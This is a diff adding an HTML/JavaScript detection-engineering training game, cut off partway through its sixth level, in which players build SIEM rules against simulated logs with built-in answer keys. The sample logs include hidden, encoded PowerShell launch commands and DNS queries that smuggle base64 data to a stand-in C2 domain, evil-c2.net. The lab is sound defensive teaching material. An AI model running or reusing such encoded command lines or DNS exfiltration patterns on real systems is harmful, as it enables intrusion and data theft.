@@ -1,0 +1,1469 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <script src="../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('sorted');</script>
+    <script src="../../../components/AchievementManager.js"></script>
+    <script src="../../../components/ModuleProgress.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Detection Engineering Lab - Eye House - Hexworth Prime</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        @keyframes hexGlow {
+            0%, 100% { text-shadow: 0 0 8px rgba(0,255,65,0.4); }
+            50% { text-shadow: 0 0 20px rgba(0,255,65,0.8); }
+        }
+        @keyframes borderPulse {
+            0%, 100% { border-color: rgba(0,255,65,0.4); box-shadow: 0 0 6px rgba(0,255,65,0.2); }
+            50% { border-color: rgba(0,255,65,0.8); box-shadow: 0 0 16px rgba(0,255,65,0.5); }
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(8px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes flash {
+            0%, 100% { opacity: 1; }
+            50%       { opacity: 0.4; }
+        }
+        @keyframes scanline {
+            0%   { transform: translateY(-100%); }
+            100% { transform: translateY(100vh); }
+        }
+
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(145deg, #0a0a0a 0%, #0f1419 50%, #0a0a0a 100%);
+            color: #00ff41;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        /* ─── Scanline overlay ─── */
+        body::before {
+            content: '';
+            position: fixed; top: 0; left: 0; width: 100%; height: 4px;
+            background: linear-gradient(transparent, rgba(0,255,65,0.06), transparent);
+            animation: scanline 6s linear infinite;
+            pointer-events: none; z-index: 999;
+        }
+
+        a.back-link {
+            position: fixed; top: 16px; left: 16px;
+            color: #00ff41; text-decoration: none;
+            font-size: 13px; opacity: 0.7;
+            transition: opacity 0.2s;
+            cursor: pointer; z-index: 100;
+        }
+        a.back-link:hover { opacity: 1; text-decoration: underline; }
+
+        /* ─── Layout ─── */
+        .game-container {
+            max-width: 1300px;
+            margin: 0 auto;
+            padding-top: 40px;
+        }
+
+        /* ─── Header ─── */
+        .header {
+            text-align: center;
+            margin-bottom: 24px;
+            animation: fadeIn 0.5s ease;
+        }
+        .header h1 {
+            font-size: 26px;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            animation: hexGlow 3s ease-in-out infinite;
+        }
+        .header .subtitle {
+            font-size: 12px;
+            color: rgba(0,255,65,0.55);
+            letter-spacing: 2px;
+            margin-top: 4px;
+        }
+
+        /* ─── Progress bar ─── */
+        .meta-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 14px;
+            font-size: 12px;
+            color: rgba(0,255,65,0.7);
+            letter-spacing: 1px;
+        }
+        .progress-track {
+            flex: 1;
+            height: 4px;
+            background: rgba(0,255,65,0.1);
+            border-radius: 2px;
+            margin: 0 16px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            background: #00ff41;
+            border-radius: 2px;
+            transition: width 0.5s ease;
+            box-shadow: 0 0 8px rgba(0,255,65,0.6);
+        }
+
+        /* ─── Two-panel layout ─── */
+        .panels {
+            display: grid;
+            grid-template-columns: 60% 40%;
+            gap: 14px;
+            animation: fadeIn 0.4s ease;
+        }
+
+        .panel {
+            background: rgba(0,0,0,0.55);
+            border: 1px solid rgba(0,255,65,0.25);
+            border-radius: 6px;
+            padding: 16px;
+            animation: borderPulse 4s ease-in-out infinite;
+        }
+
+        .panel-title {
+            font-size: 11px;
+            letter-spacing: 2px;
+            color: #00ff41;
+            text-transform: uppercase;
+            border-bottom: 1px solid rgba(0,255,65,0.2);
+            padding-bottom: 8px;
+            margin-bottom: 12px;
+        }
+
+        /* ─── Scenario description ─── */
+        .scenario-desc {
+            font-size: 12px;
+            color: rgba(0,255,65,0.8);
+            line-height: 1.7;
+            background: rgba(0,255,65,0.04);
+            border-left: 3px solid rgba(0,255,65,0.4);
+            padding: 10px 12px;
+            margin-bottom: 14px;
+            border-radius: 0 4px 4px 0;
+        }
+        .scenario-title {
+            font-size: 15px;
+            letter-spacing: 1px;
+            margin-bottom: 10px;
+            color: #00ff41;
+        }
+
+        /* ─── Log viewer ─── */
+        .log-viewer {
+            background: #060c0a;
+            border: 1px solid rgba(0,255,65,0.15);
+            border-radius: 4px;
+            padding: 10px;
+            font-size: 11px;
+            line-height: 1.8;
+            max-height: 380px;
+            overflow-y: auto;
+            color: rgba(0,255,65,0.75);
+        }
+        .log-viewer::-webkit-scrollbar { width: 4px; }
+        .log-viewer::-webkit-scrollbar-track { background: rgba(0,255,65,0.05); }
+        .log-viewer::-webkit-scrollbar-thumb { background: rgba(0,255,65,0.3); border-radius: 2px; }
+
+        .log-line { display: block; white-space: pre-wrap; word-break: break-all; }
+        .log-line.malicious { color: #ff4444; }
+        .log-line.benign    { color: rgba(0,255,65,0.55); }
+        .log-line.highlight { background: rgba(0,255,65,0.08); border-left: 2px solid #00ff41; padding-left: 6px; }
+        .log-line .ts  { color: rgba(0,255,65,0.4); }
+        .log-line .key { color: #00ccff; }
+        .log-line .val { color: #fff; }
+        .log-label {
+            font-size: 10px;
+            letter-spacing: 1.5px;
+            color: rgba(0,255,65,0.4);
+            margin-top: 10px;
+            margin-bottom: 4px;
+            text-transform: uppercase;
+        }
+
+        /* ─── Rule builder (right panel) ─── */
+        .rule-builder { }
+
+        .condition-row {
+            display: flex;
+            gap: 6px;
+            align-items: center;
+            margin-bottom: 8px;
+            animation: fadeIn 0.25s ease;
+        }
+        .condition-row select,
+        .condition-row input[type="text"] {
+            background: rgba(0,20,10,0.9);
+            border: 1px solid rgba(0,255,65,0.3);
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            padding: 5px 8px;
+            border-radius: 3px;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        .condition-row select:focus,
+        .condition-row input[type="text"]:focus {
+            border-color: #00ff41;
+            box-shadow: 0 0 8px rgba(0,255,65,0.3);
+        }
+        .condition-row select { cursor: pointer; }
+        .condition-row select option { background: #0a1a0e; }
+        .field-sel  { flex: 2; }
+        .op-sel     { flex: 1.2; }
+        .val-inp    { flex: 2; }
+
+        .connector-row {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 8px;
+            font-size: 11px;
+        }
+        .connector-btn {
+            background: transparent;
+            border: 1px solid rgba(0,255,65,0.4);
+            color: rgba(0,255,65,0.6);
+            padding: 3px 10px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-size: 10px;
+            letter-spacing: 1px;
+            transition: all 0.2s;
+        }
+        .connector-btn.active {
+            background: rgba(0,255,65,0.15);
+            color: #00ff41;
+            border-color: #00ff41;
+            box-shadow: 0 0 6px rgba(0,255,65,0.3);
+        }
+        .connector-btn:hover { border-color: #00ff41; color: #00ff41; }
+
+        .remove-btn {
+            background: transparent;
+            border: 1px solid rgba(255,50,50,0.4);
+            color: rgba(255,80,80,0.7);
+            padding: 3px 8px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 11px;
+            transition: all 0.2s;
+            flex-shrink: 0;
+        }
+        .remove-btn:hover { border-color: #ff4444; color: #ff4444; }
+
+        .btn-row {
+            display: flex;
+            gap: 8px;
+            margin-top: 10px;
+            flex-wrap: wrap;
+        }
+        .btn {
+            background: transparent;
+            border: 1px solid rgba(0,255,65,0.4);
+            color: #00ff41;
+            padding: 7px 14px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            transition: all 0.2s;
+        }
+        .btn:hover {
+            background: rgba(0,255,65,0.1);
+            border-color: #00ff41;
+            box-shadow: 0 0 10px rgba(0,255,65,0.3);
+        }
+        .btn-primary {
+            background: rgba(0,255,65,0.12);
+            border-color: #00ff41;
+            box-shadow: 0 0 8px rgba(0,255,65,0.2);
+        }
+        .btn-primary:hover {
+            background: rgba(0,255,65,0.22);
+            box-shadow: 0 0 16px rgba(0,255,65,0.45);
+        }
+        .btn-next {
+            background: rgba(0,255,65,0.18);
+            border-color: #00ff41;
+            box-shadow: 0 0 12px rgba(0,255,65,0.4);
+        }
+        .btn-next:hover {
+            background: rgba(0,255,65,0.3);
+        }
+        .btn:disabled {
+            opacity: 0.35;
+            cursor: not-allowed;
+        }
+
+        /* ─── Results panel ─── */
+        .results-panel {
+            margin-top: 14px;
+            font-size: 11px;
+            border: 1px solid rgba(0,255,65,0.2);
+            border-radius: 4px;
+            padding: 10px 12px;
+            background: rgba(0,0,0,0.4);
+            display: none;
+            animation: fadeIn 0.3s ease;
+        }
+        .results-panel.visible { display: block; }
+
+        .result-stat {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 6px;
+            color: rgba(0,255,65,0.8);
+        }
+        .result-stat .lbl { color: rgba(0,255,65,0.5); }
+        .result-stat .val-good { color: #00ff41; font-weight: bold; }
+        .result-stat .val-bad  { color: #ff4444; font-weight: bold; }
+        .result-stat .val-warn { color: #ffaa00; font-weight: bold; }
+
+        .feedback-msg {
+            margin-top: 8px;
+            padding: 8px 10px;
+            border-radius: 3px;
+            font-size: 11px;
+            line-height: 1.6;
+        }
+        .feedback-msg.success {
+            background: rgba(0,255,65,0.08);
+            border-left: 3px solid #00ff41;
+            color: #00ff41;
+        }
+        .feedback-msg.partial {
+            background: rgba(255,170,0,0.08);
+            border-left: 3px solid #ffaa00;
+            color: #ffaa00;
+        }
+        .feedback-msg.fail {
+            background: rgba(255,50,50,0.08);
+            border-left: 3px solid #ff4444;
+            color: #ff6666;
+        }
+
+        /* ─── Multi-choice (levels 5 & 6) ─── */
+        .mcq-group { margin-bottom: 14px; }
+        .mcq-label { font-size: 11px; color: rgba(0,255,65,0.6); margin-bottom: 6px; letter-spacing: 1px; }
+        .mcq-options { display: flex; flex-direction: column; gap: 5px; }
+        .mcq-opt {
+            background: rgba(0,20,10,0.7);
+            border: 1px solid rgba(0,255,65,0.2);
+            color: rgba(0,255,65,0.75);
+            padding: 6px 10px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            text-align: left;
+            transition: all 0.2s;
+        }
+        .mcq-opt:hover  { border-color: rgba(0,255,65,0.6); background: rgba(0,255,65,0.07); }
+        .mcq-opt.selected { border-color: #00ff41; background: rgba(0,255,65,0.15); color: #00ff41; }
+        .mcq-opt.correct  { border-color: #00ff41; background: rgba(0,255,65,0.2); color: #00ff41; }
+        .mcq-opt.wrong    { border-color: #ff4444; background: rgba(255,50,50,0.1); color: #ff6666; }
+
+        /* ─── Exclusion toggles (Level 5) ─── */
+        .excl-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border: 1px solid rgba(0,255,65,0.2);
+            border-radius: 3px;
+            padding: 7px 10px;
+            margin-bottom: 6px;
+            background: rgba(0,20,10,0.5);
+            cursor: pointer;
+            transition: all 0.2s;
+            font-size: 11px;
+        }
+        .excl-row:hover { border-color: rgba(0,255,65,0.5); }
+        .excl-row.active {
+            border-color: #00ff41;
+            background: rgba(0,255,65,0.1);
+        }
+        .excl-row .excl-code { color: #00ccff; font-size: 10px; }
+        .excl-row .excl-impact { color: rgba(0,255,65,0.5); font-size: 10px; }
+        .excl-checkbox {
+            width: 14px; height: 14px;
+            border: 1px solid rgba(0,255,65,0.4);
+            border-radius: 2px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 10px; flex-shrink: 0;
+        }
+        .excl-row.active .excl-checkbox { background: rgba(0,255,65,0.2); color: #00ff41; border-color: #00ff41; }
+
+        /* ─── Alert counter (Level 5) ─── */
+        .alert-meter {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 12px;
+            font-size: 12px;
+        }
+        .alert-count-display {
+            font-size: 28px;
+            font-weight: bold;
+            color: #ff4444;
+            transition: color 0.4s, text-shadow 0.4s;
+            min-width: 60px;
+            text-align: right;
+        }
+        .alert-count-display.good {
+            color: #00ff41;
+            text-shadow: 0 0 12px rgba(0,255,65,0.6);
+        }
+        .alert-count-display.warn { color: #ffaa00; }
+        .alert-bar-wrap {
+            flex: 1;
+            height: 8px;
+            background: rgba(255,50,50,0.15);
+            border-radius: 4px;
+            overflow: hidden;
+        }
+        .alert-bar-fill {
+            height: 100%;
+            background: #ff4444;
+            border-radius: 4px;
+            transition: width 0.5s ease, background 0.4s;
+        }
+        .alert-bar-fill.good { background: #00ff41; }
+        .alert-bar-fill.warn { background: #ffaa00; }
+
+        /* ─── Completion screen ─── */
+        .completion-screen {
+            display: none;
+            text-align: center;
+            padding: 40px 20px;
+            animation: fadeIn 0.6s ease;
+        }
+        .completion-screen.visible { display: block; }
+        .completion-title {
+            font-size: 22px;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            animation: hexGlow 2s ease-in-out infinite;
+            margin-bottom: 10px;
+        }
+        .completion-rank {
+            font-size: 18px;
+            color: #00ccff;
+            margin-bottom: 20px;
+            letter-spacing: 2px;
+        }
+        .completion-score {
+            font-size: 48px;
+            color: #00ff41;
+            text-shadow: 0 0 20px rgba(0,255,65,0.7);
+            margin-bottom: 8px;
+        }
+        .score-detail {
+            font-size: 12px;
+            color: rgba(0,255,65,0.6);
+            margin-bottom: 24px;
+        }
+        .xp-badge {
+            display: inline-block;
+            border: 1px solid rgba(0,255,65,0.4);
+            padding: 6px 20px;
+            border-radius: 20px;
+            font-size: 12px;
+            letter-spacing: 2px;
+            margin-bottom: 30px;
+            animation: borderPulse 2s ease-in-out infinite;
+        }
+        .breakdown-table {
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto 24px;
+            border-collapse: collapse;
+            font-size: 11px;
+        }
+        .breakdown-table td, .breakdown-table th {
+            padding: 6px 12px;
+            border-bottom: 1px solid rgba(0,255,65,0.1);
+            text-align: left;
+        }
+        .breakdown-table th { color: rgba(0,255,65,0.5); letter-spacing: 1px; font-weight: normal; }
+        .breakdown-table .pts { text-align: right; color: #00ff41; }
+
+        /* ─── Utility ─── */
+        .hidden { display: none !important; }
+        .text-dim { color: rgba(0,255,65,0.45); }
+        .score-badge {
+            background: rgba(0,255,65,0.1);
+            border: 1px solid rgba(0,255,65,0.3);
+            padding: 3px 10px;
+            border-radius: 12px;
+            font-size: 12px;
+        }
+
+        /* ─── Level intro overlay ─── */
+        .level-badge {
+            display: inline-block;
+            border: 1px solid rgba(0,255,65,0.3);
+            font-size: 10px;
+            letter-spacing: 2px;
+            padding: 2px 10px;
+            border-radius: 10px;
+            margin-bottom: 8px;
+            color: rgba(0,255,65,0.6);
+            text-transform: uppercase;
+        }
+        .difficulty-pip {
+            display: inline-block;
+            width: 8px; height: 8px;
+            border-radius: 50%;
+            background: #00ff41;
+            margin-right: 3px;
+            opacity: 0.4;
+        }
+        .difficulty-pip.lit { opacity: 1; box-shadow: 0 0 4px #00ff41; }
+
+        @media (max-width: 900px) {
+            .panels { grid-template-columns: 1fr; }
+            .header h1 { font-size: 18px; }
+        }
+    </style>
+</head>
+<body>
+<a class="back-link" onclick="window.history.back()">&#8592; Back</a>
+
+<div class="game-container">
+    <div class="header">
+        <div class="subtitle">EYE HOUSE // SIEM LAB</div>
+        <h1>Detection Engineering Lab</h1>
+    </div>
+
+    <!-- Progress / score row -->
+    <div class="meta-row">
+        <span>LEVEL <span id="lvlDisplay">1</span> / 6</span>
+        <div class="progress-track">
+            <div class="progress-fill" id="progressFill" style="width:0%"></div>
+        </div>
+        <span class="score-badge">SCORE: <span id="scoreDisplay">0</span></span>
+    </div>
+
+    <!-- Main panels (hidden during completion) -->
+    <div class="panels" id="mainPanels">
+        <!-- Left: log viewer -->
+        <div class="panel" id="logPanel">
+            <div class="panel-title">// LOG STREAM</div>
+            <div class="scenario-title" id="scenarioTitle"></div>
+            <div class="scenario-desc" id="scenarioDesc"></div>
+            <div class="log-viewer" id="logViewer"></div>
+        </div>
+
+        <!-- Right: rule builder -->
+        <div class="panel" id="builderPanel">
+            <div class="panel-title">// RULE BUILDER</div>
+            <div id="builderContent"></div>
+            <div class="results-panel" id="resultsPanel"></div>
+        </div>
+    </div>
+
+    <!-- Completion screen -->
+    <div class="completion-screen" id="completionScreen">
+        <div class="level-badge">SESSION COMPLETE</div>
+        <div class="completion-title">Analysis Complete</div>
+        <div class="completion-rank" id="rankDisplay"></div>
+        <div class="completion-score" id="finalScore"></div>
+        <div class="score-detail" id="scoreDetail"></div>
+        <div class="xp-badge">+100 XP AWARDED</div>
+        <table class="breakdown-table">
+            <thead><tr><th>LEVEL</th><th>NAME</th><th class="pts">PTS</th></tr></thead>
+            <tbody id="breakdownBody"></tbody>
+        </table>
+        <button class="btn btn-primary" onclick="location.reload()">RESTART LAB</button>
+    </div>
+</div>
+
+<script>
+// ═══════════════════════════════════════════════════════════
+// DETECTION ENGINEERING LAB — Game Engine
+// ═══════════════════════════════════════════════════════════
+
+const MAX_SCORE = 180;
+let currentLevel = 0;
+let totalScore   = 0;
+let levelScores  = [];
+let levelTested  = false; // prevent re-testing same level for extra points
+
+// ─── Level definitions ─────────────────────────────────────
+const LEVELS = [
+
+    // ── LEVEL 1: Failed Login Threshold ──────────────────
+    {
+        id: 1,
+        name: 'Failed Login Threshold',
+        difficulty: 1,
+        type: 'dropdown',
+        scenario: 'SOC analysts have flagged a potential brute-force campaign against the VPN gateway. ' +
+            'Review the authentication logs below and build a detection rule to identify attackers ' +
+            'attempting repeated failed logins. Focus on frequency, grouping, and time window.',
+        logs: [
+            { t:'08:41:02', raw:'event=auth_failure user=jdoe        src=10.0.1.15  dest=vpn.corp', tag:'benign' },
+            { t:'08:41:04', raw:'event=auth_failure user=jdoe        src=10.0.1.15  dest=vpn.corp', tag:'benign' },
+            { t:'08:41:07', raw:'event=auth_success user=jdoe        src=10.0.1.15  dest=vpn.corp', tag:'benign' },
+            { t:'09:12:01', raw:'event=auth_failure user=admin       src=185.220.101.3 dest=vpn.corp', tag:'malicious' },
+            { t:'09:12:02', raw:'event=auth_failure user=administrator src=185.220.101.3 dest=vpn.corp', tag:'malicious' },
+            { t:'09:12:03', raw:'event=auth_failure user=root        src=185.220.101.3 dest=vpn.corp', tag:'malicious' },
+            { t:'09:12:04', raw:'event=auth_failure user=svc_account src=185.220.101.3 dest=vpn.corp', tag:'malicious' },
+            { t:'09:12:05', raw:'event=auth_failure user=backup      src=185.220.101.3 dest=vpn.corp', tag:'malicious' },
+            { t:'09:12:05', raw:'event=auth_failure user=deploy      src=185.220.101.3 dest=vpn.corp', tag:'malicious' },
+            { t:'09:12:06', raw:'event=auth_failure user=test        src=185.220.101.3 dest=vpn.corp', tag:'malicious' },
+            { t:'09:15:00', raw:'event=auth_failure user=msmith      src=203.0.113.8  dest=vpn.corp', tag:'benign' },
+            { t:'09:15:01', raw:'event=auth_success user=msmith      src=203.0.113.8  dest=vpn.corp', tag:'benign' },
+        ],
+        dropdowns: [
+            {
+                label: 'Event Type',
+                id: 'dd_event',
+                options: ['(select)', 'authentication_success', 'authentication_failure', 'process_creation', 'dns_query'],
+                correct: 'authentication_failure'
+            },
+            {
+                label: 'Threshold (count in window)',
+                id: 'dd_thresh',
+                options: ['(select)', '>2 in 300s', '>5 in 60s', '>10 in 600s', '>1 in 10s'],
+                correct: '>5 in 60s'
+            },
+            {
+                label: 'Group By Field',
+                id: 'dd_group',
+                options: ['(select)', 'user', 'source_ip', 'destination', 'event_id'],
+                correct: 'source_ip'
+            }
+        ],
+        // Points: 20 correct, 10 partial (>=2 correct), bonus 10 perfect TP/FP (auto-granted with correct)
+        score: { correct: 20, partial: 10, bonus: 10 },
+        bonusThreshold: 3 // all 3 dropdowns correct = bonus
+    },
+
+    // ── LEVEL 2: Suspicious Process Execution ─────────────
+    {
+        id: 2,
+        name: 'Suspicious Process Execution',
+        difficulty: 2,
+        type: 'builder',
+        scenario: 'Threat intel reports indicate an adversary is deploying payloads via encoded PowerShell ' +
+            'commands (MITRE T1059.001). Windows Event ID 4688 logs are streaming in. Build a detection ' +
+            'rule using process name and command-line conditions to catch encoded PowerShell execution.',
+        logs: [
+            { t:'10:02:11', raw:'EventID=4688 Process=C:\\Windows\\System32\\svchost.exe     CommandLine=svchost -k netsvcs', tag:'benign' },
+            { t:'10:02:45', raw:'EventID=4688 Process=C:\\Windows\\System32\\cmd.exe         CommandLine=cmd /c ipconfig /all', tag:'benign' },
+            { t:'10:03:01', raw:'EventID=4688 Process=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine=powershell -enc JABjAG0AZAAgAD0AIAAiAGkAcABjAG8AbgBmAGkAZwAiADsA', tag:'malicious' },
+            { t:'10:03:08', raw:'EventID=4688 Process=C:\\Windows\\System32\\notepad.exe     CommandLine=notepad report.txt', tag:'benign' },
+            { t:'10:05:22', raw:'EventID=4688 Process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine=powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA', tag:'malicious' },
+            { t:'10:06:00', raw:'EventID=4688 Process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine=powershell Get-Process', tag:'benign' },
+            { t:'10:07:14', raw:'EventID=4688 Process=C:\\Program Files\\Git\\usr\\bin\\sh.exe CommandLine=sh -c git status', tag:'benign' },
+            { t:'10:09:55', raw:'EventID=4688 Process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine=powershell -nop -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0Abw==', tag:'malicious' },
+        ],
+        // Pre-defined fields for the builder
+        fields: ['process_name', 'command_line', 'event_id', 'parent_process', 'user'],
+        operators: ['contains', 'equals', 'starts_with', 'ends_with', 'does_not_contain'],
+        // Correct answer: (process_name contains powershell) AND (command_line contains -enc OR command_line contains -encodedcommand)
+        evaluate: function(conditions, connectors) {
+            // Returns { tp, fp, fn, tn } counts against the log set
+            let tp=0, fp=0, fn=0, tn=0;
+            const logs = this.logs;
+            for (const log of logs) {
+                const matched = evalConditions(conditions, connectors, log.raw.toLowerCase());
+                if (matched && log.tag === 'malicious') tp++;
+                else if (matched && log.tag === 'benign')   fp++;
+                else if (!matched && log.tag === 'malicious') fn++;
+                else tn++;
+            }
+            return { tp, fp, fn, tn, total: logs.length,
+                malicious: logs.filter(l=>l.tag==='malicious').length,
+                benign:    logs.filter(l=>l.tag==='benign').length };
+        },
+        score: { correct: 20, partial: 10, bonus: 10 }
+    },
+
+    // ── LEVEL 3: DNS Tunneling ────────────────────────────
+    {
+        id: 3,
+        name: 'Data Exfiltration via DNS',
+        difficulty: 3,
+        type: 'builder',
+        scenario: 'Threat hunters suspect a compromised host is using DNS tunneling (MITRE T1071.004) to ' +
+            'exfiltrate data. DNS query logs show normal lookups mixed with suspicious long-subdomain ' +
+            'queries. Build a multi-condition detection combining query length, request frequency, and record type.',
+        logs: [
+            { t:'11:01:00', raw:'src=192.168.1.40 qtype=A    query=google.com               len=10', tag:'benign' },
+            { t:'11:01:01', raw:'src=192.168.1.40 qtype=A    query=api.github.com           len=14', tag:'benign' },
+            { t:'11:01:05', raw:'src=192.168.1.99 qtype=TXT  query=aGVsbG8gd29ybGQ.evil-c2.net len=57', tag:'malicious' },
+            { t:'11:01:06', raw:'src=192.168.1.99 qtype=TXT  query=dGhpcyBpcyBhIHRlc3Q.evil-c2.net len=63', tag:'malicious' },
+            { t:'11:01:07', raw:'src=192.168.1.99 qtype=TXT  query=cGF5bG9hZF9jaHVua18x.evil-c2.net len=65', tag:'malicious' },
+            { t:'11:01:07', raw:'src=192.168.1.99 qtype=TXT  query=YW5vdGhlcl9jaHVua18y.evil-c2.net len=64', tag:'malicious' },
+            { t:'11:01:08', raw:'src=192.168.1.99 qtype=A    query=short.evil-c2.net        len=18', tag:'benign' },
+            { t:'11:02:10', raw:'src=192.168.1.42 qtype=MX   query=mailserver.company.com   len=22', tag:'benign' },
+            { t:'11:03:00', raw:'src=192.168.1.99 qtype=TXT  query=ZmluYWxfY2h1bmtfZG9uZQ.evil-c2.net len=61', tag:'malicious' },
+            { t:'11:03:01', raw:'src=192.168.1.10 qtype=A    query=update.microsoft.com     len=21', tag:'benign' },
+        ],
+        fields: ['query_length', 'record_type', 'query_count_per_domain', 'source_ip', 'domain'],
+        operators: ['>', '<', 'equals', 'contains', 'greater_than'],
+        evaluate: function(conditions, connectors) {
+            let tp=0, fp=0, fn=0, tn=0;
+            for (const log of this.logs) {
+                const matched = evalConditions(conditions, connectors, log.raw.toLowerCase());
+                if (matched && log.tag === 'malicious') tp++;
+                else if (matched && log.tag === 'benign')   fp++;
+                else if (!matched && log.tag === 'malicious') fn++;
+                else tn++;
+            }
+            return { tp, fp, fn, tn, total: this.logs.length,
+                malicious: this.logs.filter(l=>l.tag==='malicious').length,
+                benign:    this.logs.filter(l=>l.tag==='benign').length };
+        },
+        score: { correct: 20, partial: 10, bonus: 10 }
+    },
+
+    // ── LEVEL 4: Lateral Movement / PtH ──────────────────
+    {
+        id: 4,
+        name: 'Lateral Movement Detection',
+        difficulty: 4,
+        type: 'builder',
+        scenario: 'IR analysts detected anomalous authentication events suggesting Pass-the-Hash (PtH) ' +
+            'lateral movement (MITRE T1550.002). Windows Security events 4624 and 4672 are shown. ' +
+            'Build a compound rule: logon_type=3, auth_package=NTLM, AND privilege escalation within a short time window.',
+        logs: [
+            { t:'14:00:01', raw:'event_id=4624 logon_type=3 auth_package=ntlm user=svc_sql       src=10.0.5.10  dest=FILESERVER01', tag:'benign' },
+            { t:'14:00:05', raw:'event_id=4624 logon_type=2 auth_package=kerberos user=jdoe      src=10.0.1.20  dest=WORKSTATION04', tag:'benign' },
+            { t:'14:01:11', raw:'event_id=4624 logon_type=3 auth_package=ntlm user=administrator src=10.0.5.88  dest=DC01', tag:'malicious' },
+            { t:'14:01:12', raw:'event_id=4672 special_privileges=SeDebugPrivilege,SeImpersonatePrivilege user=administrator src=10.0.5.88', tag:'malicious' },
+            { t:'14:01:14', raw:'event_id=4624 logon_type=3 auth_package=ntlm user=administrator src=10.0.5.88  dest=FILESERVER01', tag:'malicious' },
+            { t:'14:01:15', raw:'event_id=4672 special_privileges=SeDebugPrivilege user=administrator src=10.0.5.88', tag:'malicious' },
+            { t:'14:01:17', raw:'event_id=4624 logon_type=3 auth_package=ntlm user=administrator src=10.0.5.88  dest=SQLSERVER02', tag:'malicious' },
+            { t:'14:02:00', raw:'event_id=4624 logon_type=3 auth_package=ntlm user=backup_agent  src=10.0.9.5   dest=BACKUPSERVER', tag:'benign' },
+            { t:'14:02:10', raw:'event_id=4624 logon_type=10 auth_package=kerberos user=msmith   src=10.0.1.15  dest=WORKSTATION11', tag:'benign' },
+        ],
+        fields: ['event_id', 'logon_type', 'auth_package', 'special_privileges', 'user', 'src_ip'],
+        operators: ['equals', 'contains', 'not_equals', 'greater_than', 'starts_with'],
+        evaluate: function(conditions, connectors) {
+            let tp=0, fp=0, fn=0, tn=0;
+            for (const log of this.logs) {
+                const matched = evalConditions(conditions, connectors, log.raw.toLowerCase());
+                if (matched && log.tag === 'malicious') tp++;
+                else if (matched && log.tag === 'benign')   fp++;
+                else if (!matched && log.tag === 'malicious') fn++;
+                else tn++;
+            }
+            return { tp, fp, fn, tn, total: this.logs.length,
+                malicious: this.logs.filter(l=>l.tag==='malicious').length,
+                benign:    this.logs.filter(l=>l.tag==='benign').length };
+        },
+        score: { correct: 20, partial: 10, bonus: 10 }
+    },
+
+    // ── LEVEL 5: Alert Tuning ─────────────────────────────
+    {
+        id: 5,
+        name: 'Alert Tuning - Reduce False Positives',
+        difficulty: 5,
+        type: 'tuning',
+        scenario: 'Your existing PowerShell detection rule is firing 120 alerts/day. ' +
+            'Only 5 are true positives. Review the false positive breakdown and apply exclusions ' +
+            'to reduce noise below 10 alerts/day — without missing any true threats.',
+        baseAlerts: 120,
+        truePositives: 5,
+        exclusions: [
+            { id: 'ex1', label: 'Exclude: service accounts (svc_*)',    code: 'user NOT LIKE "svc_%"',              removes: 38, removesTp: 0 },
+            { id: 'ex2', label: 'Exclude: known admin IPs (10.0.0.0/8)', code: 'src_ip NOT IN admin_ip_list',       removes: 30, removesTp: 0 },
+            { id: 'ex3', label: 'Exclude: maintenance window (02-04h)',  code: 'hour NOT BETWEEN 2 AND 4',          removes: 22, removesTp: 0 },
+            { id: 'ex4', label: 'Exclude: scheduled tasks (taskeng.exe)',code: 'parent_process != "taskeng.exe"',   removes: 15, removesTp: 0 },
+            { id: 'ex5', label: 'Exclude: interactive logon only',       code: 'logon_type = 2 OR logon_type = 10', removes: 12, removesTp: 2 },
+            { id: 'ex6', label: 'Exclude: signed scripts (Authenticode)',code: 'script_signed = true',              removes: 3,  removesTp: 3 },
+        ],
+        score: { correct: 20, partial: 10, bonus: 10 }
+    },
+
+    // ── LEVEL 6: Full Detection Pipeline ─────────────────
+    {
+        id: 6,
+        name: 'Full Detection Pipeline',
+        difficulty: 5,
+        type: 'pipeline',
+        scenario: 'MITRE ATT&CK Technique T1059.001 (PowerShell). Build a complete, production-ready ' +
+            'detection from data source selection through severity and recommended response actions.',
+        steps: [
+            {
+                label: 'DATA SOURCE',
+                question: 'Which data source provides the richest telemetry for detecting malicious PowerShell?',
+                options: [
+                    'Windows Firewall logs',
+                    'PowerShell Script Block Logging (Event 4104)',
+                    'DNS query logs',
+                    'Network flow data (NetFlow)'
+                ],
+                correct: 1
+            },
+            {
+                label: 'DETECTION LOGIC',
+                question: 'Select the most effective detection condition for T1059.001:',
+                options: [
+                    'powershell.exe parent_process = explorer.exe',
